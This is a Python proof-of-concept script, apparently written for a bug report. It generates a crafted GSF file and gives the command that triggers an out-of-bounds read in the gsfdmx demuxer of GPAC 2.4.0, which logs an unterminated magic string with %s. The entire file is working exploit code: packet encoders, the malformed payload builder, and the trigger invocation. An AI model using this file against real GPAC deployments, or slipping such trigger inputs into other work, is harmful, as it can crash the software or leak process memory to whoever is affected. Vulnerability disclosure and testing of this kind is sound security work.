#!/usr/bin/env python3
"""
Generate a minimal GSF file that triggers an OOB read in GPAC 2.4.0 gsfdmx:

src/filters/dmx_gsf.c: magic is malloc(len) (no NUL) but logged with "%s".

Trigger:
  gpac -i poc_gsf_magic_oobread.gsf:gsfdmx:magic=ABCD inspect:deep

The file contains a single "tune-in" block with:
  - outer packet header (pck_type=HDR, st_idx=0)
  - tune payload: "GS5F" + version(2) + flags + magic_len + magic_bytes
"""

import os
from pathlib import Path

def encode_vlen(val: int) -> bytes:
    # Matches gsfdmx_read_vlen():
    # 0xxxxxxx (7 bits), 10xxxxxxxxxxxxxx (14 bits), 110... (21), 1110... (28), 1111...(36)
    if val < (1 << 7):
        return bytes([val & 0x7F])
    if val < (1 << 14):
        bits = (0b10 << 14) | (val & 0x3FFF)
        return bits.to_bytes(2, "big")
    if val < (1 << 21):
        bits = (0b110 << 21) | (val & 0x1FFFFF)
        return bits.to_bytes(3, "big")
    if val < (1 << 28):
        bits = (0b1110 << 28) | (val & 0x0FFFFFFF)
        return bits.to_bytes(4, "big")
    bits = (0b1111 << 36) | (val & 0xFFFFFFFFF)
    return bits.to_bytes(5, "big")

def build_tune_payload(magic_bytes: bytes) -> bytes:
    # Signature + version + (use_seq_num bit + 7 reserved bits) + magic_len(vlen) + magic
    payload = b"GS5F" + bytes([2])
    payload += bytes([0x00])  # use_seq_num=0, reserved=0
    payload += encode_vlen(len(magic_bytes))
    payload += magic_bytes    # intentionally NOT NUL-terminated
    return payload

def build_outer_packet(tune_payload: bytes) -> bytes:
    # 1 byte: reserved(1)=0, frag_flags(2)=0, is_crypted(1)=0, pck_type(4)=HDR(0)
    first = bytes([0x00])
    st_idx = encode_vlen(0)                  # tune-in packet (st_idx==0)
    pck_len = encode_vlen(len(tune_payload))
    return first + st_idx + pck_len + tune_payload

def main():
    out = Path("poc_gsf_magic_oobread.gsf")
    magic = b"ABCD"
    data = build_outer_packet(build_tune_payload(magic))
    out.write_bytes(data)
    print(f"Wrote {out} ({out.stat().st_size} bytes)")
    print("Run (example):")
    print("  gpac -i poc_gsf_magic_oobread.gsf:gsfdmx:magic=ABCD inspect:deep")

if __name__ == "__main__":
    main()
